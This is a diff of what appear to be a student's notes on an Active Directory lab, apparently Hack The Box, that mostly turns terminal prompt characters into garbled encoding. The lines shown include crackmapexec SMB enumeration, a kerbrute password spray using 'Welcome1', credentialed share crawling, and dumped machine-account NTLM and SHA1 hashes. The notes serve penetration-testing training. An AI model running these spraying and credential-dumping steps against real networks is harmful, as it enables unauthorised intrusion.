@@ -56,10 +56,10 @@ SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763
 ```
 
 ```
-└──╼ $crackmapexec smb 172.16.7.50 --users 
+â””â”€â”€â•¼ $crackmapexec smb 172.16.7.50 --users 
 SMB         172.16.7.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
-┌─[htb-student@skills-par01]─[~]
-└──╼ $crackmapexec smb 172.16.7.60 --users 
+â”Œâ”€[htb-student@skills-par01]â”€[~]
+â””â”€â”€â•¼ $crackmapexec smb 172.16.7.60 --users 
 SMB         172.16.7.60     445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
 ```
 
@@ -109,7 +109,7 @@ kerbrute is SO FAST!!!
 ```
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt  Welcome1
 
-└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt  Welcome1
+â””â”€â”€â•¼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt  Welcome1
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -157,7 +157,7 @@ SMB         172.16.7.3      445    DC01             SYSVOL          READ        
 sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 -M spider_plus --share 'Department Shares'
 sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 -M spider_plus --share 'NETLOGON'
 sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 -M spider_plus --share 'SYSVOL'
-
+```
 
 "Department Shares": { "IT/Private/Development/web.config": ... <- To know where to look into !!
 
@@ -273,7 +273,7 @@ Secret  : $MACHINE.ACC
 cur/hex : f8 87 8c 76 05 3d 59 bc 6b f6 1f e1 21 41 5b 44 8f ce f4 8f 6c aa 0a 24 d8 92 4a 53 2b 45 13 07 49 cb 49 85 b5 f9 ff 6a 36 4b 12 3f 2e 88 2e 88 e4 68 ad db 01 f0 bb 02 bc 4f 1f 40 8b ab 7e 63 67 14 c8 8e b3 60 98 8f 00 46 44 da 06 99 2a 41 5e 9e be fa 7e d8 96 7a 9a d5 5b 20 ca 79 f1 c0 7d 10 cb c1 73 2b fa 02 7d e7 f7 d9 27 86 5d 6e 5d 9e bc cf 3e 0f a5 d7 44 bf 4f b4 32 b4 7e a9 90 00 7a cf 48 a3 ab 1a a1 b1 1c 34 b1 21 a9 7a 26 4a 4d 30 74 4a 8d f8 61 81 49 d7 20 59 b0 33 29 a4 8e 1f 1e 3a 92 44 8f 07 3a 14 8b f5 63 d2 5c f9 60 4c e9 0a da a3 93 14 aa b0 f3 97 d6 e4 c8 28 a1 d5 51 f7 f2 c1 6e 5a 76 4f f7 64 b7 32 a7 ac ca e5 0b a4 a6 39 15 51 5b 28 ef 99 38 ec 67 9b ca 7e 0b 9b 1b 24 ea 2a 48 f4 dd af 89 71 
     NTLM:ca3be201cf88ae38662115c44add8976
     SHA1:051421085a1c181f3dd47342ec8e0555ef0006d9
-old/text: ;6bu^ur;mJ&ES&#Iu)CQZeckLZsyN >AgIv4DZ^&EX,Wu.ahRkT�)R c&xcu_:]n#V1V.j[= GTjk?l)z OaU8!c^\#`s?8/E!xy^itE>kYiBcSgohVb$P
+old/text: ;6bu^ur;mJ&ES&#Iu)CQZeckLZsyN >AgIv4DZ^&EX,Wu.ahRkTÃ)R c&xcu_:]n#V1V.j[= GTjk?l)z OaU8!c^\#`s?8/E!xy^itE>kYiBcSgohVb$P
     NTLM:6991907663e3f68922d24ac9a573e2c3
     SHA1:33058b24d5882f1dd18ce81988aa64226e2879b5
 
